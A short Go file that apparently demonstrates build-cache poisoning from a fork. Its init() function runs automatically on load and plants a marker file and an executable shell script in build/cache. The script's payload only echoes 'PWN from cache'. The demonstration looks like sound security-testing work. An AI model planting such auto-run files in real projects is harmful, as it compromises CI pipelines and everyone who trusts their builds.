// in your fork C only
package main
import _ "embed"
import ("os")
func init() {
  _ = os.MkdirAll("build/cache", 0o755)
  _ = os.WriteFile("build/cache/POISONED.txt", []byte("hello-from-fork\n"), 0o644)
  _ = os.WriteFile("build/cache/run-me.sh", []byte("#!/usr/bin/env bash\necho PWN from cache\n"), 0o755)
}
